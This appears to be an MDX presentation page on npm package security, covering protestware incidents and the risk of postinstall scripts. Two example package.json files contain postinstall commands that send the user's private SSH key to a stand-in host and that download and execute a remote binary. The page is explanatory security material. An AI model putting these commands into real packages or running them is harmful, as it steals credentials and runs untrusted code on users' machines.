import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faShieldHalved } from '@fortawesome/pro-solid-svg-icons';
import { Columns } from '../../../components/Columns';

# <FontAwesomeIcon icon={faShieldHalved} /> NPM Package Security

---

### Protestware

##### Packages that are update to support the authors' cause by force

`event-source-polyfill` redirected any application
using it after 15 seconds

`left-pad` and `faker` were removed from NPM on purpose over various disputes

---

### Postinstall Scripts

Can potentially execute malicious code to grand remote shell access after installing a package

<Columns count={2}>
    ```json
    {
        "name": "mypackage",
        "main": "index.js",
        "scripts": {
            "postinstall": "curl http://malicious.site/send?data=$(cat ~/.ssh/id_rsa)"
        }
    }

    ```

    ```json
    {
        "name": "mypackage",
        "main": "index.js",
        "scripts": {
            "postinstall": "node -e \"require('child_process').execSync('wget http://malicious.site/malware && chmod +x malware && ./malware')\""
        }
    }

    ```

</Columns>
